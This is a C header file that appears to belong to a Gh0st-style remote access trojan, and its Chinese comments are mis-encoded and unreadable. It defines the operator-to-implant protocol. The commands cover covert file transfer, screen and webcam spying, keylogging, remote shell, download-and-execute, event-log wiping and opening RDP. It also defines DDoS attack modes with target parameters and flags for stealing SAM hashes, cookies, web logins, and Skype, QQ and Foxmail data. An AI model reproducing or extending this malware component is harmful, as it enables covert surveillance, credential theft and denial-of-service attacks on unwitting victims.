
#if !defined(AFX_MACROS_H_INCLUDED)
#define AFX_MACROS_H_INCLUDED

//#define BUILDDATE "20110622"

#define BUILDDATE "20130902"


// BYTE���Ҳ��256
enum
{
	// �ļ����䷽ʽ
	TRANSFER_MODE_NORMAL = 0x01,	// һ��,������ػ���Զ���Ѿ��У�ȡ��
	TRANSFER_MODE_ADDITION,			// ׷��
	TRANSFER_MODE_ADDITION_ALL,		// ȫ��׷��
	TRANSFER_MODE_OVERWRITE,		// ����
	TRANSFER_MODE_OVERWRITE_ALL,	// ȫ������
	TRANSFER_MODE_JUMP,				// ����
	TRANSFER_MODE_JUMP_ALL,			// ȫ������
	TRANSFER_MODE_CANCEL,			// ȡ������
	
	// ���ƶ˷���������
	COMMAND_ACTIVED = 0x03,			// ����˿��Լ��ʼ����
	COMMAND_LIST_DRIVE,				// �г�����Ŀ¼
	COMMAND_LIST_FILES,				// �г�Ŀ¼�е��ļ�
	COMMAND_DOWN_FILES,				// �����ļ�
	COMMAND_FILE_SIZE,				// �ϴ�ʱ���ļ���С
	COMMAND_FILE_DATA,				// �ϴ�ʱ���ļ�����
	COMMAND_EXCEPTION,				// ���䷢���쳣����Ҫ���´���
	COMMAND_CONTINUE,				// �������������������������
	COMMAND_STOP,					// ������ֹ
	COMMAND_DELETE_FILE,			// ɾ���ļ�
	COMMAND_DELETE_DIRECTORY,		// ɾ��Ŀ¼
	COMMAND_SET_TRANSFER_MODE,		// ���ô��䷽ʽ
	COMMAND_CREATE_FOLDER,			// �����ļ���
	COMMAND_RENAME_FILE,			// �ļ����ļ�����
	COMMAND_OPEN_FILE_SHOW,			// ��ʾ���ļ�
	COMMAND_OPEN_FILE_HIDE,			// ���ش��ļ�
	
	COMMAND_SCREEN_SPY,				// ��Ļ�鿴
	COMMAND_SCREEN_RESET,			// �ı���Ļ���
	COMMAND_ALGORITHM_RESET,		// �ı��㷨
	COMMAND_SCREEN_CTRL_ALT_DEL,	// ����Ctrl+Alt+Del
	COMMAND_SCREEN_CONTROL,			// ��Ļ����
	COMMAND_SCREEN_BLOCK_INPUT,		// ��������˼����������
	COMMAND_SCREEN_BLANK,			// ����˺���
	COMMAND_SCREEN_CAPTURE_LAYER,	// ��׽��
	COMMAND_SCREEN_GET_CLIPBOARD,	// ��ȡԶ�̼�����
	COMMAND_SCREEN_SET_CLIPBOARD,	// ����Զ�̼�����

	COMMAND_WEBCAM,					// ����ͷ
	COMMAND_WEBCAM_ENABLECOMPRESS,	// ����ͷ����Ҫ�󾭹�H263ѹ��
	COMMAND_WEBCAM_DISABLECOMPRESS,	// ����ͷ����Ҫ��ԭʼ����ģʽ
	COMMAND_WEBCAM_RESIZE,			// ����ͷ�����ֱ��ʣ����������INT�͵Ŀ��
	COMMAND_NEXT,					// ��һ��(���ƶ��Ѿ��򿪶Ի���)

	COMMAND_KEYBOARD,				// ���̼�¼
	COMMAND_KEYBOARD_OFFLINE,		// �������߼��̼�¼
	COMMAND_KEYBOARD_CLEAR,			// ������̼�¼����

	COMMAND_AUDIO,					// ��������

	COMMAND_SYSTEM,					// ϵͳ�������̣�����....��
	COMMAND_PSLIST,					// �����б�
	COMMAND_WSLIST,					// �����б�
	COMMAND_DIALUPASS,				// ��������
	COMMAND_KILLPROCESS,			// �رս���
	COMMAND_SHELL,					// cmdshell
	COMMAND_SESSION,				// �Ự�����ػ���������ע��, ж�أ�
	COMMAND_REMOVE,					// ж�غ���
	COMMAND_DOWN_EXEC,				// �������� - ����ִ��
	COMMAND_UPDATE_SERVER,			// �������� - ���ظ���
	COMMAND_CLEAN_EVENT,			// �������� - ���ϵͳ��־
	COMMAND_OPEN_URL_HIDE,			// �������� - ���ش���ҳ
	COMMAND_OPEN_URL_SHOW,			// �������� - ��ʾ����ҳ
	COMMAND_RENAME_REMARK,			// ��������ע
	COMMAND_REPLAY_HEARTBEAT,		// �ظ�������
	COMMAND_DDOS,					// DDOS������ʼ
	COMMAND_DDOS_STOP,				// DDOS��������
	COMMAND_HIT_HARD,				//Ӳ����
	COMMAND_OPEN_3389,				//��3389
	COMMAND_CHAJIAN,				//�������
	COMMAND_SERECT_CFG,				//����������Ժ����ӹ�����Ҫ���汾
	COMMAND_SERECT_CFG_END,
	COMMAND_SERECT_GETSTATE,
	COMMAND_CHAJIAN_FORMIQU,
	COMMAND_SERECT_RESETEND,

	//2.0�¼�
	COMMAND_PLUGIN_REQUEST,			//�������
	
	COMMAND_ONLINE_ERROR,   //add by menglz
	


	// ����˷����ı�ʶ
	TOKEN_AUTH = 101,				// Ҫ����֤
	TOKEN_HEARTBEAT,				// ������
	TOKEN_LOGIN_FALSE,				// ���߰���δ��֤״̬
	TOKEN_LOGIN_TRUE,				// ���߰�������֤״̬
	TOKEN_DRIVE_LIST,				// �������б�
	TOKEN_FILE_LIST,				// �ļ��б�
	TOKEN_FILE_SIZE,				// �ļ���С�������ļ�ʱ��
	TOKEN_FILE_DATA,				// �ļ�����
	TOKEN_TRANSFER_FINISH,			// �������
	TOKEN_DELETE_FINISH,			// ɾ�����
	TOKEN_GET_TRANSFER_MODE,		// �õ��ļ����䷽ʽ
	TOKEN_GET_FILEDATA,				// Զ�̵õ������ļ�����
	TOKEN_CREATEFOLDER_FINISH,		// �����ļ����������
	TOKEN_DATA_CONTINUE,			// ������������
	TOKEN_RENAME_FINISH,			// �����������
	TOKEN_EXCEPTION,				// ���������쳣
	
	TOKEN_BITMAPINFO,				// ��Ļ�鿴��BITMAPINFO
	TOKEN_FIRSTSCREEN,				// ��Ļ�鿴�ĵ�һ��ͼ
	TOKEN_NEXTSCREEN,				// ��Ļ�鿴����һ��ͼ
	TOKEN_CLIPBOARD_TEXT,			// ��Ļ�鿴ʱ���ͼ���������


	TOKEN_WEBCAM_BITMAPINFO,		// ����ͷ��BITMAPINFOHEADER
	TOKEN_WEBCAM_DIB,				// ����ͷ��ͼ������
	
	TOKEN_AUDIO_START,				// ��ʼ��������
	TOKEN_AUDIO_DATA,				// ������������

	TOKEN_KEYBOARD_START,			// ���̼�¼��ʼ
	TOKEN_KEYBOARD_DATA,			// ���̼�¼������
	
	TOKEN_PSLIST,					// �����б�
	TOKEN_WSLIST,					// �����б�
	TOKEN_DIALUPASS,				// ��������
	TOKEN_SHELL_START,				// Զ���ն˿�ʼ

	TOKEN_EVIDENCE_CREATE,			//�ش���ȡ�����ļ���Ϣ
	TOKEN_EVIDENCE_CREATE_ANS,			//�ش���ȡ�����ļ���Ϣ
	TOKEN_EVIDENCE_DATA,			//�ش���ȡ�ļ�����

	TOKEN_EVIDENCE_STATE,			//�鿴��ȡ״̬
	TOKEN_EVIDENCE_CONFIG,			//������ȡ��Ŀ
	TOKEN_EVIDENCE_RESET,			//��ȡ��������
	TOKEN_EVIDENCE_SREECN_ARG,      //�Զ���������
	COMMAND_SCREEN_CONTINUE,
//	TOKEN_LOGIN_FALSE,	

	//2.0�¼�
	TOKEN_PLUGIN_REQUEST,			//����������	
	TOKEN_REPLY_REMOVE,				//ж�ص�Ӧ���յ�����ƶ˲���Ϊ����ж����
	

};


#define	MAX_WRITE_RETRY			15 // ����д���ļ�����
#define	MAX_SEND_BUFFER			1024 * 8 // ��������ݳ���
#define MAX_RECV_BUFFER			1024 * 8 // ���������ݳ���


typedef struct
{	
	BYTE			bToken;			// = 1
	OSVERSIONINFOEX	OsVerInfoEx;	// �汾��Ϣ
	int				CPUClockMhz;	// CPU��Ƶ
	IN_ADDR			IPAddress;		// �洢32λ��IPv4�ĵ�ַ���ݽṹ
	char			HostName[50];	// ������
	BOOL			bIsWebCam;		// �Ƿ�������ͷ
	DWORD			dwSpeed;		// ����
	DWORD			SerVer;	
	LPSTR			szCPUID[MAX_PATH];
	char			szCaseID[32];	
	char			szClueID[32];
	char			szLeakID[64];

}LOGININFO;

enum
{
	DDOS_TCP = 10,
	DDOS_UDP,
	DDOS_SYN,
	DDOS_ICMP,
	DDOS_HTTP_GET,
	DDOS_CC
};

typedef struct
{
	BYTE			Flag;
	BYTE			AttackFlag;		// ������ʽ
	char			Domain[100];	// ��������/IP
	char			GetPage[100];
	DWORD			Port;			// �����˿�
	DWORD			Packs;			// ��������(����һ���������)
	DWORD			SleepTime;		// ��Ϣ������
	DWORD			AttackTime;		// ����ʱ��,0Ϊ������
	DWORD			CCAttack_First;	// CC������εĿ�ʼ
	DWORD			CCAttack_END;	// CC������εĽ���
	DWORD			Thread;			// �߳���
}DDOS_DATA;


typedef struct tag_INFOEVIDENCEFILE
{
	CHAR szFileName[MAX_PATH];
	int nFileSize;
}INFOEVIDENCEFILE, *LPINFOEVIDENCEFILE;

typedef struct tag_INFOEVIDENCEFILEANS
{
	BOOL bSucess;
	HANDLE hFile;
}INFOEVIDENCEFILEANS, *LPINFOEVIDENCEFILEANS;

typedef struct tag_INFOEVIDENCEDATA
{
	int nSize;
	BOOL bEnd;
	BYTE pBuf[4096];
}INFOEVIDENCEDATA, *LPINFOEVIDENCEDATA;

//��ȡ����
typedef enum
{
	SECRET_RECENT		= 0x00000001,		//������ļ�
	SECRET_WEB			= 0x00000002,		//�����web��¼
	SECRET_SKYPE		= 0x00000004,		//Skype��¼��
	SECRET_QQLOG		= 0x00000008,		//QQ�����¼
	SECRET_SAM  		= 0x00000010,		//ϵͳ��½�û�SAM�ļ�
	SECRET_SCREEN		= 0x00000020,		//��ȡ��Ļ
	SECRET_COOKIES		= 0x00000040,		//��ȡcookies����
	SECRET_CLEVERSRC	= 0x00000080,		//��������
	SECRET_FOXMAIL		= 0x00000100,		//foxmail�����ȡ
}SECRET_GET_TYPE;

typedef enum
{
	ALARMSCREEN_LIUSHUI = 0x00000001,		//���������������ˮ�¼���
	ALARMSCREEN_MINGAN = 0x00000002,		//ͼ�����߽����������¼���
	ALARMSCREEN_GUANZHU = 0x00000004,		//HTTPSҳ���IE�����������ע�¼���
}ALARMSCREEN_TYPE;

typedef enum
{
	SECRET_TYPE_START = 0,				//�Զ�
	SECRET_TYPE_STOP,					//ֹͣ
};


// �������
struct PLUGPARAMIMP
{
	char chResultPath[MAX_PATH];    //��Ų������ļ���·���������\��β
	DWORD dwMember1;              
	DWORD dwMember2;
	char szHost[MAX_PATH];			// ������
	WORD wPort;						// �˿ں�
};

// �������
struct PLUGPARAM
{
	PLUGPARAM(){memset(this,0,sizeof(PLUGPARAM));};

	DWORD dwMachineID;				// ����ID	
	PLUGPARAMIMP imp;
};


// typedef struct 
// {
// 	int nTimeInternal;	//����ʱ����
// 	int nBitCount;		//����λ��
// }INFOSCREEN, *PINFOSCREEN;
// 
// 
// typedef struct
// {
// 	DWORD dwType;
// 	int nCount;
// 	int nAvalible; 
// 	int nCapacity;
// 	//��չ���ԣ���ʱ��
// 	INFOSCREEN infoScreen;
// 	int nTypeAlarmSrn;
// }INFOSTATE, *PINFOSTATE;


#endif // !defined(AFX_MACROS_H_INCLUDED)




















